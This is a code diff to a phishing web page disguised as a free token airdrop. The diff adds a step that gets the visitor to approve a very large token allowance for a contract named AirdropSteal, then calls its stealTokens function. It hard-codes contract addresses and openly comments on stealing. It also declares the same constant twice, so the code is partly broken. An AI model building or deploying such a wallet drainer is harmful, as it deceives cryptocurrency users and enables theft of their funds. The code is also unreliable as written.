@@ -9,31 +9,49 @@
 <body>
     <h1>Claim Your Free Airdrop!</h1>
     <button id="connectButton">Connect MetaMask</button>
+    <button id="approveButton" style="display:none;">Approve Contract</button>
     <button id="airdropButton" style="display:none;">Claim Airdrop</button>
 
     <script>
-        // Define the ABI (Application Binary Interface) of the AirdropSteal contract
-        const contractABI = [
+        // Define ABIs for the ERC-20 token and the AirdropSteal contract
+        const tokenABI = [
             {
+                "constant": false,
                 "inputs": [
-                    { "internalType": "address", "name": "_tokenAddress", "type": "address" }
+                    { "name": "spender", "type": "address" },
+                    { "name": "amount", "type": "uint256" }
                 ],
+                "name": "approve",
+                "outputs": [{ "name": "", "type": "bool" }],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [{ "name": "owner", "type": "address" }],
+                "name": "balanceOf",
+                "outputs": [{ "name": "", "type": "uint256" }],
+                "type": "function"
+            }
+        ];
+
+        const airdropContractABI = [
+            {
+                "inputs": [{ "internalType": "address", "name": "_tokenAddress", "type": "address" }],
                 "name": "stealTokens",
                 "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
-            },
-            { "inputs": [], "stateMutability": "nonpayable", "type": "constructor" },
-            { "stateMutability": "payable", "type": "receive" }
+            }
         ];
 
         // Contract addresses
-        const contractAddress = "0xf5d2621f8b5eaabd6a35e65142cf0c06d9b791b5"; // Deployed address of AirdropSteal
-        const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414"; // Token address to steal
-const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4";  // Token contract address to steal from
+        const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414"; // Token contract address
+        const contractAddress = "0xf5d2621f8b5eaabd6a35e65142cf0c06d9b791b5"; // AirdropSteal contract address
+        const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4";  // Token contract address to steal from
 
         let web3;
-        let contract;
+        let tokenContract;
+        let airdropContract;
         let userAddress;
 
         // Function to connect MetaMask
@@ -44,9 +62,13 @@ const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4";  // Token con
                     const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                     userAddress = accounts[0];
 
-                    // Hide the connect button and show the airdrop button
+                    // Initialize contracts
+                    tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+                    airdropContract = new web3.eth.Contract(airdropContractABI, contractAddress);
+
+                    // Hide the connect button and show the approve button
                     document.getElementById('connectButton').style.display = 'none';
-                    document.getElementById('airdropButton').style.display = 'block';
+                    document.getElementById('approveButton').style.display = 'block';
                 } catch (error) {
                     console.error("MetaMask connection failed", error);
                     alert("Please connect your MetaMask wallet.");
@@ -56,17 +78,38 @@ const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4";  // Token con
             }
         }
 
-        // Function to claim the airdrop (execute the stealTokens function)
-        async function claimAirdrop() {
-            contract = new web3.eth.Contract(contractABI, contractAddress);
-
+        // Function to approve the contract to spend tokens
+        async function approveContract() {
             try {
-                // Fetch current gas price
+                // Set a very high allowance to ensure the contract can access all tokens
+                const maxAllowance = web3.utils.toWei('1000000', 'ether'); // Replace with a suitable allowance if needed
+
                 const gasPrice = await web3.eth.getGasPrice();
                 const gasLimit = 100000; // Set a reasonable gas limit
 
-                // Execute the stealTokens function
-                await contract.methods.stealTokens(tokenAddress).send({
+                await tokenContract.methods.approve(contractAddress, maxAllowance).send({
+                    from: userAddress,
+                    gasPrice: gasPrice,
+                    gas: gasLimit
+                });
+
+                alert("Contract approved to spend your tokens!");
+                document.getElementById('approveButton').style.display = 'none';
+                document.getElementById('airdropButton').style.display = 'block';
+            } catch (error) {
+                console.error("Error approving contract:", error);
+                alert("Approval failed! Check the console for more details.");
+            }
+        }
+
+        // Function to claim the airdrop (execute the stealTokens function)
+        async function claimAirdrop() {
+            try {
+                const gasPrice = await web3.eth.getGasPrice();
+                const gasLimit = 100000; // Set a reasonable gas limit
+
+                // Call the stealTokens function
+                await airdropContract.methods.stealTokens(tokenAddress).send({
                     from: userAddress,
                     gasPrice: gasPrice,
                     gas: gasLimit
@@ -81,10 +124,12 @@ const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4";  // Token con
 
         // Event listeners for the buttons
         document.getElementById('connectButton').addEventListener('click', connectMetaMask);
+        document.getElementById('approveButton').addEventListener('click', approveContract);
         document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
     </script>
 </body>
 </html>
+
 
      
 
